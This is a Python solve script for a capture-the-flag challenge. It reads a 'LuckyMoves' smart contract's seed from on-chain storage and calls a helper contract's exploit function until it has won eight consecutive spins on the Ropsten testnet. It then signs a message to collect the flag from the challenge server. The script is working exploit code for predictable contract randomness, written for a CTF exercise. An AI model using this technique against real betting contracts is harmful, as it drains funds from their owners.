import json

from time import sleep
from web3 import Web3, HTTPProvider
from eth_account.account import Account
from os import environ, path
from math import log

BASE_DIR = path.dirname(path.realpath(__file__))

INFURA_PROJECT_ID = environ.get('INFURA_PROJECT_ID')
LUCKYMOVES_ADDR = environ.get('LUCKYMOVES_ADDR')
WALLET_PRIVKEY = environ.get("WALLET_PRIVKEY")
COMPILED_LUCKYMOVES = json.load(open(path.join(BASE_DIR, "LuckyMoves.json"), "r"))
SOLVE_ADDR = environ.get('SOLVE_ADDR', None) or open(path.join(BASE_DIR, "solve_address.txt"), "r").read()
COMPILED_SOLVE= json.load(open(path.join(BASE_DIR, "Solve.json"), "r"))

w3 = Web3(HTTPProvider(f"https://ropsten.infura.io/v3/{INFURA_PROJECT_ID}"))

private_key= bytes.fromhex(WALLET_PRIVKEY[2:] if WALLET_PRIVKEY.startswith("0x") else WALLET_PRIVKEY)
acct = Account.from_key(private_key)
print("Using accont: {0}".format(acct.address))

w3.eth.default_account = acct.address




luckymoves_contract = w3.eth.contract(
    address=LUCKYMOVES_ADDR,
    abi=COMPILED_LUCKYMOVES["abi"],
) 

solve_contract = w3.eth.contract(
    address=SOLVE_ADDR,
    abi=COMPILED_SOLVE["abi"],
)

updated_hits = 0
while updated_hits != 8:
        # Get seed from itnernal storage
    seed = int.from_bytes(w3.eth.get_storage_at(LUCKYMOVES_ADDR,0), byteorder="big")
    print("Current Seed: ", seed)

    # check how many times we won the spin... User must win 8 times consecutevely
    hits = luckymoves_contract.functions.hits(acct.address).call()
    hits = log(hits+1, 2)
    print("Current spin hits: ", hits)
    if hits == 8:
        print("Smart contract already solved!")
        break

    # Use the Solve smart contract to win the spin
    nonce = w3.eth.get_transaction_count(acct.address) 

    exploit_txn = solve_contract.functions.exploit(
        seed
    ).buildTransaction({
        'chainId': 3,
        'gas': 300000,
        'gasPrice': w3.toWei('1', 'gwei'),
        'nonce': nonce,
    })

    signed_txn = w3.eth.account.sign_transaction(exploit_txn, private_key=private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    print("Transaction hash:", tx_hash)

    tx_receipt = w3.eth.waitForTransactionReceipt(tx_hash)

    print(tx_receipt)
    print("Successful transaction" if tx_receipt.status else "Failed transaction")

    print("Waiting to confirm hits...")
    updated_hits = luckymoves_contract.functions.hits(acct.address).call()
    updated_hits = log(updated_hits+1, 2)
    while updated_hits != hits + 1:
        sleep(5)
        updated_hits = luckymoves_contract.functions.hits(acct.address).call()
        updated_hits = log(updated_hits+1, 2)

    print("Hits updated!")



### PART 2
### Send signed message to service
from eth_account.messages import encode_defunct
from pwn import *

CHALL_HOST = environ.get("CHALL_HOST")
CHALL_PORT = environ.get("CHALL_PORT")

io = remote(CHALL_HOST, CHALL_PORT) 

msg = "Gib me flag"

message = encode_defunct(text=msg)
signed_message = w3.eth.account.sign_message(message, private_key=private_key)

io.recvuntil('Please enter your signature as a hex string:\n')

sig = signed_message.signature.hex()
print("Signature: ", sig)
io.sendline(sig)

flag = io.recvline()
print(flag)

io.close()